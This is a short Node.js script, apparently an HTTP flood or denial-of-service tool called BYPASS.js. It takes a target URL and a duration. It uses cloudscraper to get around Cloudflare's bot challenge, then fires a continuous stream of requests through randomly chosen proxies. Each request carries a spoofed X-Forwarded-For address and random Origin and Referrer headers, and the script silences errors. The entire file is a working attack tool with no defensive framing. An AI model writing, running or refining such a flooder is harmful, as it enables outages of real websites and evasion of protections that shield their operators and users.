const fs = require('fs');
const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require("randomstring");

randomByte = function () {
    return Math.round(Math.random() * 256);
};

if (process.argv.length <= 2) {
    console.log("ex: BYPASS.js https://lyra.com/ 100");
    process.exit(-1);
}

var url = process.argv[2];
var time = process.argv[3];

var int = setInterval(() => {
    fs.readFile('proxy.txt', 'utf8', (err, data) => {
        if (err) {
            console.error(err);
            return;
        }
        let proxyList = data.split('\n');
        let proxy = proxyList[Math.floor(Math.random() * proxyList.length)];

        var cookie = '';
        var useragent = '';
        cloudscraper.get(url, function (error, response, body) {
            if (error) {
            } else {
                var parsed = JSON.parse(JSON.stringify(response));
                cookie = (parsed["request"]["headers"]["cookie"]);
                useragent = (parsed["request"]["headers"]["User-Agent"]);
            }
            var rand = randomstring.generate({
                length: 10,
                charset: 'abcdefghijklmnopqstuvwxyz0123456789'
            });
            var ip = randomByte() + '.' +
                randomByte() + '.' +
                randomByte() + '.' +
                randomByte();
            const options = {
                url: url,
                proxy: 'http://' + proxy,
                headers: {
                    'User-Agent': useragent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': cookie,
                    'Origin': 'http://' + rand + '.com',
                    'Referrer': 'http://google.com/' + rand,
                    'X-Forwarded-For': ip
                }
            };

            function callback(error, response, body) {
                if (error) {
                    console.log('Error:', error);
                } else {
                    console.log('Response:', response.statusCode);
                }
            }

            request(options, callback);
        });
    });

    setTimeout(() => clearInterval(int), time * 1000);

    process.on('uncaughtException', function (err) {
        console.log('Terjadi kesalahan:', err.message);
    });

    process.on('unhandledRejection', function (err) {
        console.log('Penolakan tidak tertangani:', err.message);
    });
})